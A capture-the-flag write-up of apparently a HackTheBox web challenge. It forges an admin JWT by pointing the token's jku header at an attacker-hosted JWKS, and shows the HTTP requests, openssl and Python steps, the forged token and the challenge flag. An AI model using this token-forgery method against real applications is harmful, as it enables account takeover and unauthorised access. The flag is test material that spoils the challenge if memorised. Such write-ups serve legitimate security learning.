# Emergency
> You've been tasked with a pentesting engagement on a hospital management portal, they've provided you with a mockup build of the website and they've asked you to break their JWT implementation and find a way to login as "admin".

Target IP:port - 138.68.172.146:32627

If you're not familiar with JWTs, here's a nice starter - [Introduction to JSON Web Tokens](https://jwt.io/introduction).

# Information Gathering
When I browsed to the website, it redirected to `138.68.172.146:32627/login` and it presented a simple login form that asked for a username & password. It also displayed a registration link for signing up. Registration page was at endpoint `/register`. Registered a test account for myself with a username `abcd` and password `1234` as shown in the request below.

> Note: At this point, I already had Burp running and configured to proxy requests.

```
POST /api/register HTTP/1.1
Host: 138.68.172.146:32627
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.68.172.146:32627/register
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://138.68.172.146:32627
Content-Length: 27
Connection: close

username=abcd&password=1234

HTTP/1.1 200 OK
Server: nginx
Date: Tue, 27 Jul 2021 15:39:24 GMT
Content-Type: application/json
Content-Length: 60
Connection: close

{"message":"Successfully registered user abcd","success":1}
```

Registration successful! Logged in with the same credentials as the below request shows.

```
POST /api/login HTTP/1.1
Host: 138.68.172.146:32627
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://138.68.172.146:32627/login
Content-Type: application/x-www-form-urlencoded;charset=UTF-8
Origin: http://138.68.172.146:32627
Content-Length: 27
Connection: close

username=abcd&password=1234

HTTP/1.1 302 FOUND
Server: nginx
Date: Tue, 27 Jul 2021 15:39:43 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 226
Connection: close
Location: http://138.68.172.146:32627/dashboard
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3QvLndlbGwta25vd24vandrcy5qc29uIiwia2lkIjoiYzdjMjVkMTAtNzA3Mi00MmQ5LWFiOTAtZTRkNTZkYmIzMmU4In0.eyJ1c2VybmFtZSI6ImFiY2QiLCJpYXQiOjE2Mjc0MDAzODMsImV4cCI6MTYyNzQyMTk4M30.ZKiEDzieIa666bBaC4nKZMr4QvQbi389-tMrlySnJJFkKe4IeWBHRakMgcsEg4Fmg4IMFmWvBbXbF7BOagjFiJ6q6orwlbueIKobpkvYYV8bSnEYl9iujkCaj9VJyi-Z8z97NffA1yN9c8_cjyjyfG-FBVbJmrDfhr9lVSNhyWfQFWVsL2LoQN5uRDUQdOuHTI_0u8o8dswv1O61-nBAMYlSZAG3rLRcpKq0KwP9JrlvyvZt90Yegxy4LnRH9bNFw-OiyQfg40taNFU_fShZHzpJPIAkifPup6vCQ9tqSjYxHA9-Cq8nULxabJR9mvDUeUGuMAxj5mHxgfyTpphb5w; Path=/
```

The application returned a JWT as a cookie which looked like this.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3QvLndlbGwta25vd24vandrcy5qc29uIiwia2lkIjoiYzdjMjVkMTAtNzA3Mi00MmQ5LWFiOTAtZTRkNTZkYmIzMmU4In0.eyJ1c2VybmFtZSI6ImFiY2QiLCJpYXQiOjE2Mjc0MDAzODMsImV4cCI6MTYyNzQyMTk4M30.ZKiEDzieIa666bBaC4nKZMr4QvQbi389-tMrlySnJJFkKe4IeWBHRakMgcsEg4Fmg4IMFmWvBbXbF7BOagjFiJ6q6orwlbueIKobpkvYYV8bSnEYl9iujkCaj9VJyi-Z8z97NffA1yN9c8_cjyjyfG-FBVbJmrDfhr9lVSNhyWfQFWVsL2LoQN5uRDUQdOuHTI_0u8o8dswv1O61-nBAMYlSZAG3rLRcpKq0KwP9JrlvyvZt90Yegxy4LnRH9bNFw-OiyQfg40taNFU_fShZHzpJPIAkifPup6vCQ9tqSjYxHA9-Cq8nULxabJR9mvDUeUGuMAxj5mHxgfyTpphb5w
```

This JWT was used in all the subsequent requests to the application, for example, a request to `/dashboard`.

```
GET /dashboard HTTP/1.1
Host: 138.68.172.146:32627
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://138.68.172.146:32627/login
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3QvLndlbGwta25vd24vandrcy5qc29uIiwia2lkIjoiYzdjMjVkMTAtNzA3Mi00MmQ5LWFiOTAtZTRkNTZkYmIzMmU4In0.eyJ1c2VybmFtZSI6ImFiY2QiLCJpYXQiOjE2Mjc0MDAzODMsImV4cCI6MTYyNzQyMTk4M30.ZKiEDzieIa666bBaC4nKZMr4QvQbi389-tMrlySnJJFkKe4IeWBHRakMgcsEg4Fmg4IMFmWvBbXbF7BOagjFiJ6q6orwlbueIKobpkvYYV8bSnEYl9iujkCaj9VJyi-Z8z97NffA1yN9c8_cjyjyfG-FBVbJmrDfhr9lVSNhyWfQFWVsL2LoQN5uRDUQdOuHTI_0u8o8dswv1O61-nBAMYlSZAG3rLRcpKq0KwP9JrlvyvZt90Yegxy4LnRH9bNFw-OiyQfg40taNFU_fShZHzpJPIAkifPup6vCQ9tqSjYxHA9-Cq8nULxabJR9mvDUeUGuMAxj5mHxgfyTpphb5w
Upgrade-Insecure-Requests: 1
```

Used [jwt.io](https://jwt.io/) to view the headers and claims of this JWT and here's what it looked like.

![Original JWT](./img/og-jwt.png)

Its headers consisted of the `alg` header with a value of RS256 (RSA + SHA256) as its signing algorithm. At the time, I wasn't familiar with the `jku` or `kid` headers so I checked out the `jwks.json` file before proceeding. Fetched it with a quick `wget`.

```
$ wget http://138.68.172.146:32627/.well-known/jwks.json

--2021-07-27 11:49:02--  http://138.68.172.146:32627/.well-known/jwks.json
Connecting to 138.68.172.146:32627... connected.
HTTP request sent, awaiting response... 200 OK
Length: 732 [application/json]
Saving to: ‘jwks.json’

jwks.json                         100%[==========================================================>]     732  --.-KB/s    in 0s      

2021-07-27 11:49:03 (29.1 MB/s) - ‘jwks.json’ saved [732/732]

$ cat jwks.json | jq .                                  
{
  "keys": [
    {
      "alg": "RS256",
      "e": "65537",
      "kid": "c7c25d10-7072-42d9-ab90-e4d56dbb32e8",
      "kty": "RSA",
      "n": "18493205612110331613539604381757542357566230166100220962465664460395838847250590988903546861340648068792528772948374168381218426975726860639250300272737187087665211869407509044478196142274631343597620743828634469526437011365430832822973910126998448409906199863124290298902404764522210089412318653703597480850136340388095577457465068937862647074432517411280970979634337521840268650585537809269507248879678773013061198244664435060174377154640170194636634950609172706980639513839390896255376500070486424630116863963964815575062928223628329334651661626072080540569992204505883023885196151588802517016472507397191211778669",
      "use": "sig"
    }
  ]
}
```

Notice the key ID matches, so this key was being used by the application to verify token signatures. Also, notice the `n` (modulus) and `e` (public exponent) values used in RSA.

# Research and Idea
Next step was to research and read up on the 2 headers. I came across a very helpful medium post - [Hacking JWT Tokens: jku Claim Misuse](https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c). I learned the `jku` header held the JSON Web Key Set (JWKS) URL to the JSON-formatted public keys used for verifying the token, which in this case was `http://localhost/.well-known/jwks.json`. Lastly, `kid` was the key ID value `c7c25d10-7072-42d9-ab90-e4d56dbb32e8`.

The idea was to
1. Creating an RSA private/public keypair.
2. Creating a `new-jwks.json` file to serve.
3. Creating a new signed JWT with the desired headers & claims.

and see if that gave out the flag! This worked because the application wasn't checking key integrity of the key being used to verify tokens and where was that key sourced from.

# Forging a Token

### 1. Creating an RSA private/public keypair

Created a 2048-bit RSA private/public keypair - `keypair.pem` was the private key and `publickey.crt` was the public key.

```
$ openssl genrsa -out keypair.pem 2048
Generating RSA private key, 2048 bit long modulus
....+++
..................................+++
e is 65537 (0x10001)

$ openssl rsa -in keypair.pem -pubout -out publickey.crt
writing RSA key
```

### 2. Creating a `new-jwks.json` file to serve

Firstly, made a copy of the original jwks.json file.

```
$ cp jwks.json new-jwks.json
```

Now, needed to get the new `n` and `e` values from the newly created public key. Used the following py3 script

```
from Crypto.PublicKey import RSA

fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()

print("n:", key.n)
print("e:", key.e)
```

New values
```
$ python3 get_rsa_params.py
n: 27406542884207265303274521919195882753631375923637917553613615110052013262221257158064382676128597555192722990960434192294724113235142061789130340359733627833770246206101985046348034526526739626065816329342702830514845055301358083211257904617665961233170267778002016237590062352875719858311459144055430178231683681125786999321785346830838276819376649766353041262204515234024139478684858387909392836989328928675129518912577324236981354231054684879093286777908244963315773151342387875653768809457855013447509530338179132321892783431296221199874878321419651857919611469486024948947479961221106062455679404832606021651911
e: 65537
```

Substituted these values in the `new-jwks.json` file. This is our final file to serve.

### 3. Creating a new signed JWT with the desired headers & claims

Created a new JWT with a new `jku` header and `username` claim.

![New JWT](./img/new-jwt.png)

Since the goal was to get admin, `admin` was the new username value and the `jku` URL was something I controlled that served the `new-jwks.json` file.

Pasted in the new private/public keys and noticed the "Signature Verified" checkmark appear. Alright, the new forged JWT to be used was ready!

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly84ZTVjOGRmYjUxZTYubmdyb2suaW8vbmV3LWp3a3MuanNvbiIsImtpZCI6ImM3YzI1ZDEwLTcwNzItNDJkOS1hYjkwLWU0ZDU2ZGJiMzJlOCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjI3NDAwMzgzLCJleHAiOjE2Mjc0MjE5ODN9.tW3yYHNjJYDzilfbNe8VPwpIVrBDBrLh-HZDJtJRrLT1kKfFVE419fvmZR-4XC-zSousAjYuMiyk7dLxY_B_h9uwJzap0TU10iGpVnUM-khAl9bvSkQE16cetHScBwHFo3SmiJF-O16qgmTFR-rwrtA2vB5S64r13hRExLdDXhNvvJS7pYNriq7s036ipIqcEdqVv7b5XBmuYoJzANmNgnwCL3kNg0rkvd_e0V6KzjeWIxunkNjkfi5Y50fgHQlKkgcL-ITz20q5jMbcLyIRfzB_cNZnVt5QWNtXJc4LA8g5lK3ukOiIgT6XMNJiGJXEXd-evqQkVUrKyBElxvLyyQ
```

# Solve

In Burp, sent the `/dashboard` request to Repeater. Set the `Cookie` header with the new JWT and sent a request. Response had our flag in it! :)

![Exploit Request](./img/exploit.png)

Flag - `HTB{your_JWTS_4r3_cl41m3d!!}`